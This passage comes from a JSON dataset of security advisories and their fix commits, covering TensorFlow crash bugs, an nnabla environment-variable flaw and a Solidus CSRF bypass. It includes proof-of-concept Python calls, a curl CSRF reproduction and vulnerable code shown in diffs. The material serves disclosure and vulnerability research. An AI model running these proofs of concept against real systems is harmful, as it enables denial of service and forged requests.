      "summary": "CHECK-fail in AddManySparseToTensorsMap ### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in  `tf.raw_ops.AddManySparseToTensorsMap`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nsparse_indices = tf.constant(530, shape=[1, 1], dtype=tf.int64)\nsparse_values = tf.ones([1], dtype=tf.int64)\n\nshape = tf.Variable(tf.ones([55], dtype=tf.int64))\nshape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))\n\ntf.raw_ops.AddManySparseToTensorsMap(sparse_indices=sparse_indices,\n                    sparse_values=sparse_values,\n                    sparse_shape=shape)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/kernels/sparse_tensors_map_ops.cc#L257) takes the values specified in `sparse_shape` as dimensions for the output shape: \n\n```cc\n    TensorShape tensor_input_shape(input_shape->vec<int64>());\n```\n\nThe [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.\n  \n```cc\ntemplate <class Shape>\nTensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate <class Shape>\nStatus TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate <class Shape>\nStatus TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial && (num_elements() < 0 || size < 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements < 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c](https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c",
      "commit_sha": "69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c",
      "patch": "SINGLE",
      "chain_ord": "['69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c']",
      "before_first_fix_commit": "{'6f9896890c4c703ae0a0845394086e2e1e523299'}",
      "last_fix_commit": "69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/20/2021, 19:14:41",
      "message": "Fix overflow CHECK issue with `tf.raw_ops.AddManySparseToTensorsMap`.\n\nPiperOrigin-RevId: 369492969\nChange-Id: I1d70d6c0c92e3d7a25bc3b3aa2a0c0ac9688bf81",
      "author": "Amit Patankar",
      "comments": null,
      "stats": "{'additions': 19, 'deletions': 7, 'total': 26}",
      "files": "{'tensorflow/core/kernels/sparse_tensors_map_ops.cc': {'additions': 19, 'deletions': 7, 'changes': 26, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c/tensorflow%2Fcore%2Fkernels%2Fsparse_tensors_map_ops.cc', 'patch': '@@ -21,16 +21,14 @@ limitations under the License.\\n #include <utility>\\n #include <vector>\\n \\n-#include \"tensorflow/core/framework/op_kernel.h\"\\n-#include \"tensorflow/core/framework/register_types.h\"\\n-\\n #include \"tensorflow/core/framework/op_kernel.h\"\\n #include \"tensorflow/core/framework/register_types.h\"\\n #include \"tensorflow/core/framework/resource_mgr.h\"\\n #include \"tensorflow/core/framework/tensor.h\"\\n #include \"tensorflow/core/framework/tensor_util.h\"\\n #include \"tensorflow/core/framework/types.h\"\\n #include \"tensorflow/core/lib/gtl/inlined_vector.h\"\\n+#include \"tensorflow/core/util/overflow.h\"\\n #include \"tensorflow/core/util/sparse/sparse_tensor.h\"\\n \\n namespace tensorflow {\\n@@ -254,16 +252,30 @@ class AddManySparseToTensorsMapOp : public SparseTensorAccessingOp {\\n         errors::InvalidArgument(\\n             \"Rank of input SparseTensor should be > 1, but saw rank: \", rank));\\n \\n-    TensorShape tensor_input_shape(input_shape->vec<int64>());\\n+    auto input_shape_vec = input_shape->vec<int64>();\\n+    int new_num_elements = 1;\\n+    bool overflow_ocurred = false;\\n+    for (int i = 0; i < input_shape_vec.size(); i++) {\\n+      new_num_elements =\\n+          MultiplyWithoutOverflow(new_num_elements, input_shape_vec(i));\\n+      if (new_num_elements < 0) {\\n+        overflow_ocurred = true;\\n+      }\\n+    }\\n+\\n+    OP_REQUIRES(\\n+        context, !overflow_ocurred,\\n+        errors::Internal(\"Encountered overflow from large input shape.\"));\\n+\\n+    TensorShape tensor_input_shape(input_shape_vec);\\n     gtl::InlinedVector<int64, 8> std_order(rank);\\n     std::iota(std_order.begin(), std_order.end(), 0);\\n     SparseTensor input_st;\\n     OP_REQUIRES_OK(context, SparseTensor::Create(*input_indices, *input_values,\\n                                                  tensor_input_shape, std_order,\\n                                                  &input_st));\\n \\n-    auto input_shape_t = input_shape->vec<int64>();\\n-    const int64 N = input_shape_t(0);\\n+    const int64 N = input_shape_vec(0);\\n \\n     Tensor sparse_handles(DT_INT64, TensorShape({N}));\\n     auto sparse_handles_t = sparse_handles.vec<int64>();\\n@@ -274,7 +286,7 @@ class AddManySparseToTensorsMapOp : public SparseTensorAccessingOp {\\n     // minibatch entries.\\n     TensorShape output_shape;\\n     OP_REQUIRES_OK(context, TensorShapeUtils::MakeShape(\\n-                                input_shape_t.data() + 1,\\n+                                input_shape_vec.data() + 1,\\n                                 input_shape->NumElements() - 1, &output_shape));\\n \\n     // Get groups by minibatch dimension'}}",
      "message_norm": "fix overflow check issue with `tf.raw_ops.addmanysparsetotensorsmap`.\n\npiperorigin-revid: 369492969\nchange-id: i1d70d6c0c92e3d7a25bc3b3aa2a0c0ac9688bf81",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('369492969', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/sparse_tensors_map_ops.cc'])",
      "num_files": 1.0
    },
    {
      "index": 56,
      "vuln_id": "GHSA-27j5-4p9v-pp67",
      "cwe_id": "{'CWE-617'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/8a6e874437670045e6c7dc6154c7412b4a2135e2'}",
      "dataset": "osv",
      "summary": "`std::abort` raised from `TensorListReserve` ### Impact\nProviding a negative element to `num_elements` list argument of  `tf.raw_ops.TensorListReserve` causes the runtime to abort the process due to reallocating a `std::vector` to have a negative number of elements:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.TensorListReserve(\n  element_shape = tf.constant([1]),\n  num_elements=tf.constant([-1]),\n  element_dtype = tf.int32)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/list_kernels.cc#L312) calls `std::vector.resize()` with the new size controlled by input given by the user, without checking that this input is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [8a6e874437670045e6c7dc6154c7412b4a2135e2](https://github.com/tensorflow/tensorflow/commit/8a6e874437670045e6c7dc6154c7412b4a2135e2).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
      "published_date": "2021-08-25",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/8a6e874437670045e6c7dc6154c7412b4a2135e2",
      "commit_sha": "8a6e874437670045e6c7dc6154c7412b4a2135e2",
      "patch": "SINGLE",
      "chain_ord": "['8a6e874437670045e6c7dc6154c7412b4a2135e2']",
      "before_first_fix_commit": "{'3e23241a7f330f62c701f5ceb10f6594cd735f70'}",
      "last_fix_commit": "8a6e874437670045e6c7dc6154c7412b4a2135e2",
      "chain_ord_pos": 1.0,
      "commit_datetime": "07/10/2021, 00:32:55",
      "message": "Validate num_elements input in tf.raw_ops.TensorListReserve\n\nPiperOrigin-RevId: 383954564\nChange-Id: I454bd78eff85bc4f16ddb7e608596971cca47f8f",
      "author": "Laura Pak",
      "comments": null,
      "stats": "{'additions': 4, 'deletions': 0, 'total': 4}",
      "files": "{'tensorflow/core/kernels/list_kernels.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/8a6e874437670045e6c7dc6154c7412b4a2135e2/tensorflow%2Fcore%2Fkernels%2Flist_kernels.cc', 'patch': '@@ -302,6 +302,10 @@ class TensorListReserve : public OpKernel {\\n     PartialTensorShape element_shape;\\n     OP_REQUIRES_OK(c, TensorShapeFromTensor(c->input(0), &element_shape));\\n     int32 num_elements = c->input(1).scalar<int32>()();\\n+    OP_REQUIRES(c, num_elements >= 0,\\n+                errors::InvalidArgument(\"The num_elements to reserve must be a \"\\n+                                        \"non negative number, but got \",\\n+                                        num_elements));\\n     TensorList output;\\n     output.element_shape = element_shape;\\n     output.element_dtype = element_dtype_;'}}",
      "message_norm": "validate num_elements input in tf.raw_ops.tensorlistreserve\n\npiperorigin-revid: 383954564\nchange-id: i454bd78eff85bc4f16ddb7e608596971cca47f8f",
      "language": "en",
      "entities": "[('validate', 'ACTION', ''), ('383954564', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/list_kernels.cc'])",
      "num_files": 1.0
    },
    {
      "index": 460,
      "vuln_id": "GHSA-4q2w-rw7m-xqw6",
      "cwe_id": "{'CWE-807'}",
      "score": 9.8,
      "chain": "{'https://github.com/sony/nnabla/commit/e87347648ab7210529a0e60f0849680de8e9b63a'}",
      "dataset": "osv",
      "summary": "Sony Neural Network Libraries reliance on untrusted inputs prior to v1.0.10 nbla/logger.cpp in libnnabla.a in Sony Neural Network Libraries (aka nnabla) prior to v1.0.10 relies on the HOME environment variable, which might be untrusted.",
      "published_date": "2022-05-13",
      "chain_len": 1,
      "project": "https://github.com/sony/nnabla",
      "commit_href": "https://github.com/sony/nnabla/commit/e87347648ab7210529a0e60f0849680de8e9b63a",
      "commit_sha": "e87347648ab7210529a0e60f0849680de8e9b63a",
      "patch": "SINGLE",
      "chain_ord": "['e87347648ab7210529a0e60f0849680de8e9b63a']",
      "before_first_fix_commit": "{'b164980f08f3ed7740439b51d4e5ca79db0d149e', '05cd50648786cc044d3b131239299f91f399e3b8'}",
      "last_fix_commit": "e87347648ab7210529a0e60f0849680de8e9b63a",
      "chain_ord_pos": 1.0,
      "commit_datetime": "11/15/2018, 08:24:39",
      "message": "Merge pull request #299 from sony/feature/20181107-fix-getenv-usage\n\nAvoid get HOME dir with getenv.",
      "author": "Takuya Narihira",
      "comments": null,
      "stats": "{'additions': 6, 'deletions': 6, 'total': 12}",
      "files": "{'src/nbla/logger.cpp': {'additions': 6, 'deletions': 6, 'changes': 12, 'status': 'modified', 'raw_url': 'https://github.com/sony/nnabla/raw/e87347648ab7210529a0e60f0849680de8e9b63a/src%2Fnbla%2Flogger.cpp', 'patch': '@@ -48,21 +48,21 @@ std::shared_ptr<spdlog::logger> get_logger(void) {\\n       logfile = logpath + \"\\\\\\\\nbla_lib.log\";\\n     }\\n #else\\n-    const char *homedir = getenv(\"HOME\");\\n+    const char *homedir = nullptr;\\n     if (homedir == nullptr) {\\n       struct passwd *pw = getpwuid(getuid());\\n       if (pw != nullptr) {\\n         homedir = pw->pw_dir;\\n+        logpath = homedir;\\n+        logpath += \"/nnabla_data\";\\n+        mkdir(logpath.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);\\n       }\\n     }\\n     if (homedir == nullptr) {\\n-      logpath = \"/tmp_\";\\n+      logpath = \"/tmp/nnabla_\";\\n       logpath += getuid();\\n-    } else {\\n-      logpath = homedir;\\n+      mkdir(logpath.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);\\n     }\\n-    logpath += \"/nnabla_data\";\\n-    mkdir(logpath.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);\\n     logpath += \"/log\";\\n     mkdir(logpath.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);\\n     logfile = logpath + \"/nbla_lib.log\";'}}",
      "message_norm": "merge pull request #299 from sony/feature/20181107-fix-getenv-usage\n\navoid get home dir with getenv.",
      "language": "en",
      "entities": "[('#299', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/nbla/logger.cpp'])",
      "num_files": 1.0
    },
    {
      "index": 1972,
      "vuln_id": "GHSA-h3fg-h5v3-vf8m",
      "cwe_id": "{'CWE-352'}",
      "score": 5.3,
      "chain": "{'https://github.com/solidusio/solidus/commit/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6', 'https://github.com/solidusio/solidus/commit/4d17cacf066d9492fc04eb3a0b16084b47376d81'}",
      "dataset": "osv",
      "summary": "CSRF forgery protection bypass in solidus_frontend ### Impact\nCSRF vulnerability that allows a malicious site to add an item to the user's cart without their knowledge.\n\nAll `solidus_frontend` versions are affected. If you're using your own storefront, please, follow along to make sure you're not affected.\n\nTo reproduce the issue:\n\n- Pick the id for a variant with available stock. From the rails console:\n\n  ```ruby\n  Spree::Variant.in_stock.pluck(:id)\n  ```\n\n  Say we pick variant id `2`.\n\n- Launch your application, for instance, on `http://localhost:3000`:\n\n  ```bash\n  bin/rails server\n  ```\n\n- Open your browser dev tools.\n\n- Click on whatever link in your store.\n\n- Copy the value of the `Cookie` request header sent for the previous request from your browser dev tools.\n\n- Execute the following, using your previously selected variant id and the value of the `Cookie` header (notice how it doesn't contain any authentication token):\n\n  ```bash\n  curl -X POST -d \"variant_id=2&quantity=1\" -H \"Cookie: guest_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklrWlRVMWRQWnpKMVZVdFNXRzlPVW1aaWJHTjZZa0VpIiwiZXhwIjpudWxsLCJwdXIiOiJjb29raWUuZ3Vlc3RfdG9rZW4ifX0%3D--5006ba5d346f621c760a29b6a797bf351d17d1b8; _sandbox_session=vhutu5%2FL9NmWrUpGc3DxrFA%2FFsQD1dHn1cNsD7nvE84zcjWf17Af4%2F%2F2Vab3md71b6KTb9NP6WktdXktpwH4eU01jEGIBXG5%2BMzW5nL0nb4W269qk1io4LYljvoOg8%2BZVll7oJCVkJLKKh0sSoS0Kg8j%2FCHHs%2BsShohP%2BGnA%2Bfr9Ub8H6HofpSmloSpsfHHygmX0ho03fEgzHJ4DD5wJctaNKwg7NhVikHh5kgIPPHl84OGCgv3p2oe9jR19HTxOKq7BtyvDd7XZsecWhkcfS8BPnvDDUWZG6qpAEFI5kWo81KkpSJ%2Bp6Q1HOo8%3D--n3G2vgaDG7VS%2B%2FhF--ZTjxBAkfGG3hpr4GRQ2S1Q%3D%3D; __profilin=p%3Dt\" http://localhost:3000/orders/populate\n  ```\n\n- Reload your browser and look at how your cart got updated.\n\n### Patches\n\nPlease, upgrade `solidus` to versions `3.1.5`, `3.0.5` or `2.11.14`.\n\nAfter upgrading, make sure you read the \"Upgrade notes\"  section below.\n\n### Upgrade notes\n\nThe patch adds CSRF token verification to the \"Add to cart\" action. Adding forgery protection to a form that missed it can have some side effects.\n\n#### `InvalidAuthenticityToken` errors\n\nIf you're using the `:exception` strategy, it's likely that after upgrading, you'll see more `ActionController::InvalidAuthenticityToken` errors popping out in your logs. Due to browser-side cache, a form can be re-rendered and sent without any attached request cookie (for instance, when re-opening a mobile browser). That will cause an authentication error, as the sent token won't match with the one in the session (none in this case). That's a known problem in the Rails community (see https://github.com/rails/rails/issues/21948), and, at this point, there's no perfect solution.\n\nAny attempt to mitigate the issue should be seen at the application level. For an excellent survey of all the available options, take a look at https://github.com/betagouv/demarches-simplifiees.fr/blob/5b4f7f9ae9eaf0ac94008b62f7047e4714626cf9/doc/adr-csrf-forgery.md. The latter is a third-party link. As the information is relevant here, we're going to copy it below, but it should be clear that all the credit goes to @kemenaran:\n\n> # Protecting against request forgery using CRSF tokens\n> \n> ## Context\n> \n> Rails has CSRF protection enabled by default, to protect against POST-based CSRF attacks.\n> \n> To protect from this, Rails stores two copies of a random token (the so-named CSRF token) on each request:\n> - one copy embedded in each HTML page,\n> - another copy in the user session.\n> \n> When performing a POST request, Rails checks that the two copies match \u2013 and otherwise denies the request. This protects against an attacker that would generate a form secretly pointing to our website: the attacker can't read the token in the session, and so can't post a form with a valid token.\n> \n> The problem is that, much more often, this has false positives. There are several cases for that, including:\n> \n> 1. The web browser (often mobile) loads a page containing a form, then is closed by the user. Later, when the browser is re-opened, it restores the page from the cache. But the session cookie has expired, and so is not restored \u2013 so the copy of the CSRF token stored in the session is missing. When the user submits the form, they get an \"InvalidAuthenticityToken\" exception.\n> \n> 2. The user attempts to fill a form, and gets an error message (usually in response to a POST request). They close the browser. When the browser is re-opened, it attempts to restore the page. On Chrome this is blocked by the browser, because the browser denies retrying a (probably non-idempotent) POST request. Safari however happily retries the POST request \u2013 but without sending any cookies (in an attempt to avoid having unexpected side-effects). So the copy of the CSRF token in the session is missing (because no cookie was sent), and the user get an \"InvalidAuthenticityToken\" exception.\n> \n> ## Options considered\n> \n> ### Extend the session cookie duration\n> \n> We can configure the session cookie to be valid for a longer time (like 2 weeks).\n> \n> Pros:\n> - It solves 1., because when the browser restores the page, the session cookie is still valid.\n> \n> Cons:\n> - Users would be signed-in for a much longer time by default, which has unacceptable security implications.\n> - It doesn't solve 2. (because Safari doesn't send any cookie when restoring a page from a POST request)\n> \n> ### Change the cache parameters\n> \n> We can send a HTTP cache header stating 'Cache-Control: no-store, no-cache'. This instructs the browser to never keep any copy of the page, and to always make a request to the server to restore it.\n> \n> This solution was attempted during a year in production, and solved 1. \u2013 but also introduced another type of InvalidAuthenticityToken errors. In that scenario, the user attempts to fill a form, and gets an error message (usually in response to a POST request). They then navigate on another domain (like France Connect), then hit the \"Back\" button. Crossing back the domain boundary may cause the browser to either block the request or retry an invalid POST request.\n> \n> Pros:\n> - It solves 1., because on relaunch the browser requests a fresh page again (instead of serving it from its cache), thus retrieving a fresh session and a fresh matching CSRF token.\n> \n> Cons:\n> - It doesn't solve 2.\n> - It causes another type of InvalidAuthenticityToken errors.\n> \n> ### Using a null-session strategy\n> \n> We can change the default protect_from_forgery strategy to :null_session. This makes the current request use an empty session for the request duration.\n> \n> Pros:\n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted.\n> \n> Cons:\n> - The user is asked to sign-in only after filling and submitting the form, losing their time and data\n> - The user will not be redirected to their original page after signing-in\n> - It has potential security implications: as the (potentically malicious) request runs anyway, variables cached by a controller before the Null session is created may allow the form submission to succeed anyway (https://www.veracode.com/blog/managing-appsec/when-rails-protectfromforgery-fails)\n> \n> ### Using a reset-session strategy\n> \n> We can change the default protect_from_forgery strategy to :reset_session. This clears the user session permanently, logging them out until they log in again.\n> \n> Pros: \n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted.\n> \n> Cons:\n> - A forgery error in a browser tab will disconnect the user in all its open tabs\n> - It has potential security implications: as the (potentically malicious) request runs anyway, variables cached by a controller before the Null session is created may allow the form submission to succeed anyway (https://www.veracode.com/blog/managing-appsec/when-rails-protectfromforgery-fails)\n> - It allows an attacker to disconnect an user on demand, which is not only inconvenient, but also has security implication (the attacker could then log the user on it's own attacker account, pretending to be the user account)\n> \n> ### Redirect to login form\n> \n> When a forgery error occurs, we can instead redirect to the login form.\n> \n> Pros:\n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted (but the user data is lost).\n> - It kind of solves 2., by redirecting to a \"Please sign-in\" page when a previously POSTed form is reloaded.\n> \n> Cons:\n> - Not all forms require authentication \u2013 so for public forms there is no point redirecting to the login form. \n> - The user will not be redirected to their original page after signing-in (because setting the redirect path is a state-changing action, and it is dangerous to let an unauthorized request changing the state \u2013 an attacker could control the path where an user is automatically redirected to.)\n> - The implementation is finicky, and may introduce security errors. For instance, a naive implementation that catches the exception and redirect_to the sign-in page will prevent Devise from running a cleanup code \u2013 which means the user will still be logged, and the CSRF protection is bypassed. However a well-tested implementation that lets Devise code run should avoid these pittfalls.\n> \n> ### Using a long-lived cookie for CSRF tokens\n> \n> Instead of storing the CSRF token in the session cookie (which is deleted when the browser is closed), we can instead store it in a longer-lived cookie. For this we need to patch Rails.\n> \n> Pros:\n> - It solves 1., because when the user submits a stale form, even if the session cookie because stale, the long-lived CSRF cookie is still valid.\n> \n> Cons:\n> - It doesn't solve 2., because when Safari retries a POST request, it sends none of the cookies (not even long-lived ones).\n> - Patching Rails may introduce security issues (now or in the future)\n\n#### Broken behavior due to session expiration + template cache\n\nAlthough pretty unlikely, you should make sure that your current setup for cache/session expiration is compatible. The upgrade can break the addition of products to the cart if both:\n\n- The \"Add to cart\" form is being cached (usually along with the variant information).\n\n- A user session is reset at every or every few requests.\n\nThe token validation depends on the issuing and consuming sessions being the same. If a product page is cached with the token in it, it can become stale on a subsequent rendering if the session changes.\n\nTo check that you're safe, after having upgraded locally, go through the following steps:\n\n- Enable cache on dev mode:\n\n  ```bash\n  bin/rails dev:cache\n  ```\n\n- Visit the page for a variant with stock.\n\n- Reload that page several times.\n\n- Click on the \"Add to cart\"  button.\n\n- Remember to rerun `bin/rails dev:cache` to turn off cache again.\n\nNo error or session reset should happen.\n\nOtherwise, you can try with:\n\n- Revisiting how your session gets expired.\n- Changing the caching strategy to exclude the token.\n\n#### Using weaker CSRF protection strategies\n\nIt's also important to understand that a complete fix will only be in place when using the `:exception` forgery protection strategy. The `solidus_frontend` engine can't do pretty much anything otherwise. Using weaker CSRF strategies should be an informed and limited decision made by the application team. After the upgrade:\n\n- An app using `:null_session` should also be safe, but there will be side effects. That strategy runs with a null object session. As such, no order and no user is found on it. A new `cart` state order is created in the database, associated with no user. Next time the user visits the site, they won't find any difference in its cart state.\n\n- An app using `:reset_session` is not entirely safe. That strategy resets the session. That means that registered users will be logged out. Next time a user visits, they'll see the cart with the items added during the CSRF attack, although it won't be associated with their account in the case of registered users.\n\n#### Reversing the update\n\nIf you still want to deploy the upgraded version before changing your application code (if the latter is needed), you can add the following workaround to your `config/application.rb` (however, take into account that you'll keep being vulnerable):\n\n```ruby\nconfig.after_initialize do\n  Spree::OrdersController.skip_before_action :verify_authenticity_token, only: [:populate]\nend\n```\n\n### Workarounds\n\nIf an upgrade is not an option, you can work around the issue by adding the following to `config/application.rb`:\n\n```ruby\nconfig.after_initialize do\n  Spree::OrdersController.protect_from_forgery with: ApplicationController.forgery_protection_strategy.name.demodulize.underscore.to_sym, only: [:populate]\nend\n```\n\nHowever, go through the same safety check detailed on \"Upgrade notes\" above.\n\n### References\n\n- [CSRF on the Rails guides](https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)\n- [How CSRF tokens are generated and validated on Rails](https://medium.com/rubyinside/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef)\n- [Solidus security](https://solidus.io/security/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an [issue](https://github.com/solidusio/solidus/issues) or a [discussion](https://github.com/solidusio/solidus/discussions) in Solidus.\n* Email us at [security@solidus.io](mailto:security@soliidus.io)\n* Contact the core team on [Slack](http://slack.solidus.io/)",
      "published_date": "2022-01-06",
      "chain_len": 2,
      "project": "https://github.com/solidusio/solidus",
      "commit_href": "https://github.com/solidusio/solidus/commit/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6",
      "commit_sha": "a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6",
      "patch": "MULTI",
      "chain_ord": "['4d17cacf066d9492fc04eb3a0b16084b47376d81', 'a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6']",
      "before_first_fix_commit": "{'4d17cacf066d9492fc04eb3a0b16084b47376d81', 'c6b892696881f88d209efaedd8bb378e8261953f'}",
      "last_fix_commit": "a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6",
      "chain_ord_pos": 2.0,
      "commit_datetime": "12/20/2021, 08:25:33",
      "message": "Merge pull request from GHSA-h3fg-h5v3-vf8m\n\nProtect `Spree::OrdersController#populate` against CSRF attacks",
      "author": "Marc Busqu\u00e9",
      "comments": null,
      "stats": "{'additions': 0, 'deletions': 1, 'total': 1}",
      "files": "{'frontend/app/controllers/spree/orders_controller.rb': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https://github.com/solidusio/solidus/raw/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6/frontend%2Fapp%2Fcontrollers%2Fspree%2Forders_controller.rb', 'patch': \"@@ -10,7 +10,6 @@ class OrdersController < Spree::StoreController\\n     before_action :assign_order, only: :update\\n     # note: do not lock the #edit action because that's where we redirect when we fail to acquire a lock\\n     around_action :lock_order, only: :update\\n-    skip_before_action :verify_authenticity_token, only: [:populate]\\n \\n     def show\\n       @order = Spree::Order.find_by!(number: params[:id])\"}}",
      "message_norm": "merge pull request from ghsa-h3fg-h5v3-vf8m\n\nprotect `spree::orderscontroller#populate` against csrf attacks",
      "language": "en",
      "entities": "[('ghsa-h3fg-h5v3-vf8m', 'VULNID', 'GHSA'), ('protect', 'ACTION', ''), ('csrf', 'SECWORD', ''), ('attacks', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['frontend/app/controllers/spree/orders_controller.rb'])",
      "num_files": 1.0
    },
    {
      "index": 2452,
      "vuln_id": "GHSA-mq5c-prh3-3f3h",
      "cwe_id": "{'CWE-665'}",
      "score": 3.6,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9'}",
      "dataset": "osv",
      "summary": "Invalid validation in `QuantizeAndDequantizeV2` ### Impact\nThe validation in `tf.raw_ops.QuantizeAndDequantizeV2` allows invalid values for `axis` argument:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([0.0], shape=[1], dtype=float)\ninput_min = tf.constant(-10.0)\ninput_max = tf.constant(-10.0)\n\ntf.raw_ops.QuantizeAndDequantizeV2(\n  input=input_tensor, input_min=input_min, input_max=input_max,\n  signed_input=False, num_bits=1, range_given=False, round_mode='HALF_TO_EVEN',\n  narrow_range=False, axis=-2)\n``` \n\nThe [validation](https://github.com/tensorflow/tensorflow/blob/eccb7ec454e6617738554a255d77f08e60ee0808/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L74-L77) uses `||` to mix two different conditions:\n\n```cc\nOP_REQUIRES(ctx,\n  (axis_ == -1 || axis_ < input.shape().dims()),\n  errors::InvalidArgument(...));\n```\n\nIf `axis_ < -1` the condition in `OP_REQUIRES` will still be true, but this value of `axis_` results in heap underflow. This allows attackers to read/write to other data on the heap.\n\n### Patches\nWe have patched the issue in GitHub commit [c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9](https://github.com/tensorflow/tensorflow/commit/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9",
      "commit_sha": "c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9",
      "patch": "SINGLE",
      "chain_ord": "['c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9']",
